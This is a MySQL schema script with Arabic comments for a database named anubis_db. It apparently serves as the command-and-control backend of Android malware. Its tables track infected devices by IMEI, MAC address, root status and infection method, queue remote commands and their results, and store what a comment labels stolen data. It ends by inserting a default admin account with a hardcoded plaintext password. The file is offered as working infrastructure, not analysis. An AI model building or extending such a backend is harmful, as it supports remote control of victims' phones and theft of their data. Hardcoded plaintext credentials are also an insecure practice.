CREATE DATABASE IF NOT EXISTS anubis_db;
USE anubis_db;

-- جدول الأجهزة
CREATE TABLE devices (
    id VARCHAR(100) PRIMARY KEY,
    model VARCHAR(200),
    manufacturer VARCHAR(200),
    android_version VARCHAR(50),
    ip_address VARCHAR(50),
    mac_address VARCHAR(50),
    imei VARCHAR(50),
    root_status BOOLEAN,
    infection_method VARCHAR(100),
    infected_by VARCHAR(100),
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- جدول الأوامر
CREATE TABLE commands (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(100),
    command VARCHAR(200),
    status VARCHAR(50) DEFAULT 'pending',
    result TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    executed_at TIMESTAMP NULL,
    FOREIGN KEY (device_id) REFERENCES devices(id)
);

-- جدول البيانات المسروقة
CREATE TABLE captured_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(100),
    data TEXT,
    data_type VARCHAR(50),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(id)
);

-- جدول المستخدمين
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) UNIQUE,
    password VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- إدخال مستخدم افتراضي
INSERT INTO users (username, password) VALUES ('admin', 'anubis2024');
